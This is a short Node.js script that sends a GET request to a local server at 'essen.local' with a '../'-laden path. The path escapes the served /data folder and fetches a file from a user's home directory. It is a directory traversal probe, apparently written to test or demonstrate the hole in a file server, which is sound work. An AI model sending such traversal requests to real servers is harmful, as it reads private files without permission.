var http = require("http");
var request = http.request({
 hostname: "essen.local",
 port: 3001,
 path: "/data/../../../../../Users/johan/electronics-reference-sheet.jpg",
 method: "GET",
 headers: {Accept: "text/html"}
}, function(response) {
 var str = '';
 response.on('data', function (chunk) { str += chunk; });
 response.on('error', console.log);
 response.on('end', function () { console.log(str); });
});
request.end();

